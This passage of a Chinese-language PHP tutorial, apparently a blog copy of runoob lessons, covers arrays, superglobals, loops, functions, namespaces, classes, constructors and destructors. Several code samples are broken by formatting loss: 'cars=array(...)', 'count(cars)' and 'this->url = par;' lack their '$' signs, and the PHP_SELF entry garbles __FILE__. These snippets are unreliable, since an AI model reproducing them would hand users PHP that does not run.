class="keyword">array</span>();</span><br></pre></td></tr></table></figure><p>count() 函数用于返回数组的长度（元素的数量）：</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    cars=<span class="keyword">array</span>(<span class="string">"Volvo"</span>,<span class="string">"BMW"</span>,<span class="string">"Toyota"</span>); </span><br><span class="line"><span class="keyword">echo</span> count(cars);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> PHP 超级全局变量</p><hr><p>超级全局变量在PHP 4.1.0之后被启用, 是PHP系统中自带的变量，在一个脚本的全部作用域中都可用。</p><hr><h1 id="PHP-超级全局变量"><a href="#PHP-超级全局变量" class="headerlink" title="PHP 超级全局变量"></a>PHP 超级全局变量</h1><p>PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。</p><p>PHP 超级全局变量列表:</p><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><h2 id="PHP-SERVER"><a href="#PHP-SERVER" class="headerlink" title="PHP $_SERVER"></a>PHP $_SERVER</h2><p>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。这个数组中的项目由 Web 服务器创建。不能保证每个服务器都提供全部项目；服务器可能会忽略一些，或者提供一些没有在这里列举出来的项目。</p><table><thead><tr><th>元素/代码</th><th>描述</th></tr></thead><tbody><tr><td>$_SERVER[‘PHP_SELF’]</td><td>当前执行脚本的文件名，与 document root 有关。例如，在地址为 <a href="http://example.com/test.php/foo.bar">http://example.com/test.php/foo.bar</a> 的脚本中使用 $<em>SERVER[‘PHP_SELF’] 将得到 /test.php/foo.bar。<em>_FILE</em></em> 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</td></tr><tr><td>$_SERVER[‘GATEWAY_INTERFACE’]</td><td>服务器使用的 CGI 规范的版本；例如，”CGI/1.1”。</td></tr><tr><td>$_SERVER[‘SERVER_ADDR’]</td><td>当前运行脚本所在的服务器的 IP 地址。</td></tr><tr><td>$_SERVER[‘SERVER_NAME’]</td><td>当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。(如: <a href="http://www.runoob.com">www.runoob.com</a>)</td></tr><tr><td>$_SERVER[‘SERVER_SOFTWARE’]</td><td>服务器标识字符串，在响应请求时的头信息中给出。 (如：Apache/2.2.24)</td></tr><tr><td>$_SERVER[‘SERVER_PROTOCOL’]</td><td>请求页面时通信协议的名称和版本。例如，”HTTP/1.0”。</td></tr><tr><td>$_SERVER[‘REQUEST_METHOD’]</td><td>访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。</td></tr><tr><td>$_SERVER[‘REQUEST_TIME’]</td><td>请求开始时的时间戳。从 PHP 5.1.0 起可用。 (如：1377687496)</td></tr><tr><td>$_SERVER[‘QUERY_STRING’]</td><td>query string（查询字符串），如果有的话，通过它进行页面访问。</td></tr><tr><td>$_SERVER[‘HTTP_ACCEPT’]</td><td>当前请求头中 Accept: 项的内容，如果存在的话。</td></tr><tr><td>$_SERVER[‘HTTP_ACCEPT_CHARSET’]</td><td>当前请求头中 Accept-Charset: 项的内容，如果存在的话。例如：”iso-8859-1,*,utf-8”。</td></tr><tr><td>$_SERVER[‘HTTP_HOST’]</td><td>当前请求头中 Host: 项的内容，如果存在的话。</td></tr><tr><td>$_SERVER[‘HTTP_REFERER’]</td><td>引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。)</td></tr><tr><td>$_SERVER[‘HTTPS’]</td><td>如果脚本是通过 HTTPS 协议被访问，则被设为一个非空的值。</td></tr><tr><td>$_SERVER[‘REMOTE_ADDR’]</td><td>浏览当前页面的用户的 IP 地址。</td></tr><tr><td>$_SERVER[‘REMOTE_HOST’]</td><td>浏览当前页面的用户的主机名。DNS 反向解析不依赖于用户的 REMOTE_ADDR。</td></tr><tr><td>$_SERVER[‘REMOTE_PORT’]</td><td>用户机器上连接到 Web 服务器所使用的端口号。</td></tr><tr><td>$_SERVER[‘SCRIPT_FILENAME’]</td><td>当前执行脚本的绝对路径。</td></tr><tr><td>$_SERVER[‘SERVER_ADMIN’]</td><td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。(如：<a href="mailto:someone@runoob.com">someone@runoob.com</a>)</td></tr><tr><td>$_SERVER[‘SERVER_PORT’]</td><td>Web 服务器使用的端口。默认值为 “80”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。</td></tr><tr><td>$_SERVER[‘SERVER_SIGNATURE’]</td><td>包含了服务器版本和虚拟主机名的字符串。</td></tr><tr><td>$_SERVER[‘PATH_TRANSLATED’]</td><td>当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。</td></tr><tr><td>$_SERVER[‘SCRIPT_NAME’]</td><td>包含当前脚本的路径。这在页面需要指向自己时非常有用。<strong>FILE</strong> 常量包含当前脚本(例如包含文件)的完整路径和文件名。</td></tr><tr><td>$_SERVER[‘SCRIPT_URI’]</td><td>URI 用来指定要访问的页面。例如 “/index.html”。</td></tr></tbody></table><h2 id="PHP-REQUEST"><a href="#PHP-REQUEST" class="headerlink" title="PHP $_REQUEST"></a>PHP $_REQUEST</h2><p>PHP $_REQUEST 用于收集HTML表单提交的数据。</p><h2 id="PHP-POST"><a href="#PHP-POST" class="headerlink" title="PHP $_POST"></a>PHP $_POST</h2><p>PHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。</p><h2 id="PHP-GET"><a href="#PHP-GET" class="headerlink" title="PHP $_GET"></a>PHP $_GET</h2><p>PHP $_GET 同样被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。</p><h1 id="PHP-循环-While-循环"><a href="#PHP-循环-While-循环" class="headerlink" title="PHP 循环 - While 循环"></a>PHP 循环 - While 循环</h1><hr><p>循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。</p><hr><h2 id="PHP-循环"><a href="#PHP-循环" class="headerlink" title="PHP 循环"></a>PHP 循环</h2><p>在您编写代码时，您经常需要让相同的代码块一次又一次地重复运行。我们可以在代码中使用循环语句来完成这个任务。</p><p>在 PHP 中，提供了下列循环语句：</p><ul><li><strong>while</strong> - 只要指定的条件成立，则循环执行代码块</li><li><strong>do…while</strong> - 首先执行一次代码块，然后在指定的条件成立时重复这个循环</li><li><strong>for</strong> - 循环执行代码块指定的次数</li><li><strong>foreach</strong> - 根据数组中每个元素来循环代码块</li></ul><hr><h2 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a>while 循环</h2><p>while 循环将重复执行代码块，直到指定的条件不成立。</p><h1 id="PHP-循环-For-循环"><a href="#PHP-循环-For-循环" class="headerlink" title="PHP 循环 - For 循环"></a>PHP 循环 - For 循环</h1><hr><p>循环执行代码块指定的次数，或者当指定的条件为真时循环执行代码块。</p><hr><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h2><p>for 循环用于您预先知道脚本需要运行的次数的情况。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (初始值; 条件; 增量)</span><br><span class="line">&#123;</span><br><span class="line">    要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数：</p><ul><li><strong>初始值</strong>：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。</li><li><strong>条件</strong>：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。</li><li><strong>增量</strong>：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。</li></ul><p><strong>注释：</strong>上面的<strong>初始值</strong>和<strong>增量</strong>参数可为空，或者有多个表达式（用逗号分隔）。</p><h2 id="foreach-循环"><a href="#foreach-循环" class="headerlink" title="foreach 循环"></a>foreach 循环</h2><p>foreach 循环用于遍历数组。</p><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($array <span class="keyword">as</span> $value)</span><br><span class="line">&#123;</span><br><span class="line">    要执行代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每进行一次循环，当前数组元素的值就会被赋值给 $value 变量（数组指针会逐一地移动），在进行下一次循环时，您将看到数组中的下一个值。</p><h1 id="PHP-函数"><a href="#PHP-函数" class="headerlink" title="PHP 函数"></a>PHP 函数</h1><hr><p>PHP 的真正威力源自于它的函数。</p><p>在 PHP 中，提供了超过 1000 个内建的函数。</p><hr><h2 id="创建-PHP-函数"><a href="#创建-PHP-函数" class="headerlink" title="创建 PHP 函数"></a>创建 PHP 函数</h2><p>函数是通过调用函数来执行的。</p><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP 函数准则：</p><ul><li>函数的名称应该提示出它的功能</li><li>函数名称以字母或下划线开头（不能以数字开头）</li></ul><h2 id="PHP-函数-添加参数"><a href="#PHP-函数-添加参数" class="headerlink" title="PHP 函数 - 添加参数"></a>PHP 函数 - 添加参数</h2><p>为了给函数添加更多的功能，我们可以添加参数，参数类似变量。</p><p>参数就在函数名称后面的一个括号内指定。</p><h2 id="PHP-函数-返回值"><a href="#PHP-函数-返回值" class="headerlink" title="PHP 函数 - 返回值"></a>PHP 函数 - 返回值</h2><p>如需让函数返回一个值，请使用 return 语句。</p><h1 id="PHP-魔术常量"><a href="#PHP-魔术常量" class="headerlink" title="PHP 魔术常量"></a>PHP 魔术常量</h1><p>PHP 向它运行的任何脚本提供了大量的预定义常量。</p><p>不过很多常量都是由不同的扩展库定义的，只有在加载了这些扩展库时才会出现，或者动态加载后，或者在编译时已经包括进去了。</p><p>有八个魔术常量它们的值随着它们在代码中的位置改变而改变。</p><h1 id="PHP-命名空间-namespace"><a href="#PHP-命名空间-namespace" class="headerlink" title="PHP 命名空间(namespace)"></a>PHP 命名空间(namespace)</h1><p>PHP 命名空间可以解决以下两类问题：</p><ol><li>用户编写的代码与PHP内部的类/函数/常量或第三方类/函数/常量之间的名字冲突。</li><li>为很长的标识符名称(通常是为了缓解第一类问题而定义的)创建一个别名（或简短）的名称，提高源代码的可读性。</li></ol><h1 id="PHP-面向对象"><a href="#PHP-面向对象" class="headerlink" title="PHP 面向对象"></a>PHP 面向对象</h1><p><strong>对象的主要三个特性：</strong></p><ul><li>对象的行为：可以对 对象施加那些操作，开灯，关灯就是行为。</li><li>对象的形态：当施加那些方法是对象如何响应，颜色，尺寸，外型。</li><li>对象的表示：对象的表示就相当于身份证，具体区分在相同的行为与状态下有什么不同。</li></ul><h2 id="面向对象内容"><a href="#面向对象内容" class="headerlink" title="面向对象内容"></a>面向对象内容</h2><ul><li><strong>类</strong> − 定义了一件事物的抽象特点。类的定义包含了数据的形式以及对数据的操作。</li><li><strong>对象</strong> − 是类的实例。</li><li><strong>成员变量</strong> − 定义在类内部的变量。该变量的值对外是不可见的，但是可以通过成员函数访问，在类被实例化为对象后，该变量即可称为对象的属性。</li><li><strong>成员函数</strong> − 定义在类的内部，可用于访问对象的数据。</li><li><strong>继承</strong> − 继承性是子类自动共享父类数据结构和方法的机制，这是类之间的一种关系。在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把这个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</li><li><strong>父类</strong> − 一个类被其他类继承，可将该类称为父类，或基类，或超类。</li><li><strong>子类</strong> − 一个类继承其他类称为子类，也可称为派生类。</li><li><strong>多态</strong> − 多态性是指相同的函数或方法可作用于多种类型的对象上并获得不同的结果。不同的对象，收到同一消息可以产生不同的结果，这种现象称为多态性。</li><li><strong>重载</strong> − 简单说，就是函数或者方法有同样的名称，但是参数列表不相同的情形，这样的同名不同参数的函数或者方法之间，互相称之为重载函数或者方法。</li><li><strong>抽象性</strong> − 抽象性是指将具有一致的数据结构（属性）和行为（操作）的对象抽象成类。一个类就是这样一种抽象，它反映了与应用有关的重要性质，而忽略其他一些无关内容。任何类的划分都是主观的，但必须与具体的应用有关。</li><li><strong>封装</strong> − 封装是指将现实世界中存在的某个客体的属性与行为绑定在一起，并放置在一个逻辑单元内。</li><li><strong>构造函数</strong> − 主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</li><li><strong>析构函数</strong> − 析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。析构函数往往用来做”清理善后” 的工作（例如在建立对象时用new开辟了一片内存空间，应在退出前在析构函数中用delete释放）。</li></ul><h2 id="PHP-类定义"><a href="#PHP-类定义" class="headerlink" title="PHP 类定义"></a>PHP 类定义</h2><p>PHP 定义类通常语法格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpClass</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> $var1;</span><br><span class="line">  <span class="keyword">var</span> $var2 = <span class="string">"constant string"</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">myfunc</span> <span class="params">($arg1, $arg2)</span> </span>&#123;</span><br><span class="line">     [..]</span><br><span class="line">  &#125;</span><br><span class="line">  [..]</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解析如下：</p><ul><li>类使用 <strong>class</strong> 关键字后加上类名定义。</li><li>类名后的一对大括号({})内可以定义变量和方法。</li><li>类的变量使用 <strong>var</strong> 来声明, 变量也可以初始化值。</li><li>函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。</li></ul><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 成员变量 */</span></span><br><span class="line">  <span class="keyword">var</span> $url;</span><br><span class="line">  <span class="keyword">var</span> $title;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 成员函数 */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span><span class="params">($par)</span></span>&#123;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;url = $par;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span><span class="params">($par)</span></span>&#123;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;title = $par;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量 <strong>$this</strong> 代表自身的对象。</p><p><strong>PHP_EOL</strong> 为换行符。</p><hr><h2 id="PHP-中创建对象"><a href="#PHP-中创建对象" class="headerlink" title="PHP 中创建对象"></a>PHP 中创建对象</h2><p>类创建后，我们可以使用 <strong>new</strong> 运算符来实例化该类的对象：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$runoob = <span class="keyword">new</span> Site;</span><br><span class="line">$taobao = <span class="keyword">new</span> Site;</span><br><span class="line">$google = <span class="keyword">new</span> Site;</span><br></pre></td></tr></table></figure><p>以上代码我们创建了三个对象，三个对象各自都是独立的，接下来我们来看看如何访问成员方法与成员变量。</p><h3 id="调用成员方法"><a href="#调用成员方法" class="headerlink" title="调用成员方法"></a>调用成员方法</h3><p>在实例化对象后，我们可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调用成员函数，设置标题和URL</span></span><br><span class="line">$runoob-&gt;setTitle( <span class="string">"菜鸟教程"</span> );</span><br><span class="line">$taobao-&gt;setTitle( <span class="string">"淘宝"</span> );</span><br><span class="line">$google-&gt;setTitle( <span class="string">"Google 搜索"</span> );</span><br><span class="line"></span><br><span class="line">$runoob-&gt;setUrl( <span class="string">'www.runoob.com'</span> );</span><br><span class="line">$taobao-&gt;setUrl( <span class="string">'www.taobao.com'</span> );</span><br><span class="line">$google-&gt;setUrl( <span class="string">'www.google.com'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用成员函数，获取标题和URL</span></span><br><span class="line">$runoob-&gt;getTitle();</span><br><span class="line">$taobao-&gt;getTitle();</span><br><span class="line">$google-&gt;getTitle();</span><br><span class="line"></span><br><span class="line">$runoob-&gt;getUrl();</span><br><span class="line">$taobao-&gt;getUrl();</span><br><span class="line">$google-&gt;getUrl();</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><h2 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 成员变量 */</span> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> $url; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> $title; </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 成员函数 */</span> </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span><span class="params">($par)</span></span>&#123; </span><br><span class="line"></span><br><span class="line">     this-&gt;url = par; </span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span><span class="params">()</span></span>&#123; </span><br><span class="line"></span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL; </span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span><span class="params">($par)</span></span>&#123; </span><br><span class="line"></span><br><span class="line">     this-&gt;title = par; </span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span><span class="params">()</span></span>&#123; </span><br><span class="line"></span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL; </span><br><span class="line"></span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$runoob = <span class="keyword">new</span> Site; </span><br><span class="line"></span><br><span class="line">$taobao = <span class="keyword">new</span> Site; </span><br><span class="line"></span><br><span class="line">$google = <span class="keyword">new</span> Site; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用成员函数，设置标题和URL </span></span><br><span class="line"></span><br><span class="line">$runoob-&gt;setTitle( <span class="string">"菜鸟教程"</span> ); </span><br><span class="line"></span><br><span class="line">$taobao-&gt;setTitle( <span class="string">"淘宝"</span> ); </span><br><span class="line"></span><br><span class="line">$google-&gt;setTitle( <span class="string">"Google 搜索"</span> ); </span><br><span class="line"></span><br><span class="line">$runoob-&gt;setUrl( <span class="string">'www.runoob.com'</span> ); </span><br><span class="line"></span><br><span class="line">$taobao-&gt;setUrl( <span class="string">'www.taobao.com'</span> ); </span><br><span class="line"></span><br><span class="line">$google-&gt;setUrl( <span class="string">'www.google.com'</span> ); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用成员函数，获取标题和URL </span></span><br><span class="line"></span><br><span class="line">$runoob-&gt;getTitle(); </span><br><span class="line"></span><br><span class="line">$taobao-&gt;getTitle(); </span><br><span class="line"></span><br><span class="line">$google-&gt;getTitle(); </span><br><span class="line"></span><br><span class="line">$runoob-&gt;getUrl(); </span><br><span class="line"></span><br><span class="line">$taobao-&gt;getUrl(); </span><br><span class="line"></span><br><span class="line">$google-&gt;getUrl(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行实例 »</p><p>执行以上代码，输出结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">菜鸟教程</span><br><span class="line">淘宝</span><br><span class="line">Google 搜索</span><br><span class="line">www.runoob.com</span><br><span class="line">www.taobao.com</span><br><span class="line">www.google.com</span><br></pre></td></tr></table></figure><hr><h2 id="PHP-构造函数"><a href="#PHP-构造函数" class="headerlink" title="PHP 构造函数"></a>PHP 构造函数</h2><p>构造函数是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，在创建对象的语句中与 new 运算符一起使用。</p><p>PHP 5 允许开发者在一个类中定义一个方法作为构造函数，语法格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void __construct ([ mixed $args [, $... ]] )</span><br></pre></td></tr></table></figure><p>在上面的例子中我们就可以通过构造方法来初始化 $url 和 $title 变量：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">( $par1, $par2 )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;url = $par1;</span><br><span class="line">   <span class="keyword">$this</span>-&gt;title = $par2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们就不需要再调用 setTitle 和 setUrl 方法了：</p><h2 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$runoob = <span class="keyword">new</span> Site(<span class="string">'www.runoob.com'</span>, <span class="string">'菜鸟教程'</span>); </span><br><span class="line">$taobao = <span class="keyword">new</span> Site(<span class="string">'www.taobao.com'</span>, <span class="string">'淘宝'</span>); </span><br><span class="line">$google = <span class="keyword">new</span> Site(<span class="string">'www.google.com'</span>, <span class="string">'Google 搜索'</span>); </span><br><span class="line"><span class="comment">// 调用成员函数，获取标题和URL </span></span><br><span class="line">$runoob-&gt;getTitle(); </span><br><span class="line">$taobao-&gt;getTitle(); </span><br><span class="line">$google-&gt;getTitle(); </span><br><span class="line">$runoob-&gt;getUrl(); </span><br><span class="line">$taobao-&gt;getUrl(); </span><br><span class="line">$google-&gt;getUrl();</span><br></pre></td></tr></table></figure><p>运行实例 »</p><hr><h2 id="析构函数"><a href="#析构函数" class="headerlink" title="析构函数"></a>析构函数</h2><p>析构函数(destructor) 与构造函数相反，当对象结束其生命周期时（例如对象所在的函数已调用完毕），系统自动执行析构函数。</p><p>PHP 5 引入了析构函数的概念，这类似于其它面向对象的语言，其语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void __destruct ( void )</span><br></pre></td></tr></table></figure><h3 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDestructableClass</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">print</span> <span class="string">"构造函数\n"</span>;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = <span class="string">"MyDestructableClass"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">print</span> <span class="string">"销毁 "</span> . <span class="keyword">$this</span>-&gt;name . <span class="string">"\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> MyDestructableClass();</span><br><span class="line"><span 